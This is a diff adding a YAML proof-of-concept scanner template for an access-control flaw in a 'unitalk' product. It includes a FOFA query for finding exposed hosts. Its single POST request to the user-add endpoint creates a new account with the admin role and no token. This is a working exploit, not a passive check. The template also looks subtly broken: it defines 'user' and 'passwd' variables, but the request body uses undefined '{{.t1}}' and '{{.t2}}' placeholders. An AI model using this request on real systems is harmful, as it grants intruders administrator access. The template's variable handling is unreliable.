@@ -1,0 +1,20 @@
+id: poc-yaml-unitalk-add-anyuser-add
+info:
+  name: unitalk add 任意用户添加漏洞
+  severity: high
+  tags:
+  - 访问控制错误
+  finger: unitalk
+  fofa: title="unitalk"
+variables:
+  user: random_str(5)
+  passwd: random_str(8)
+requests:
+- method: POST
+  path: /unitalk/v1.0/user/add.json
+  headers:
+    Content-Type: application/json;charset=UTF-8
+  data: '{"name":"{{.t1}}","role":"admin","pwd":"{{.t2}}","token":""}'
+  expression: status_code == 200 && contains(body,"新增用户成功") && contains(body,"\"Response\":")
+    && !contains(body,"<") && contains(content_type,"application/json")
+transport: http
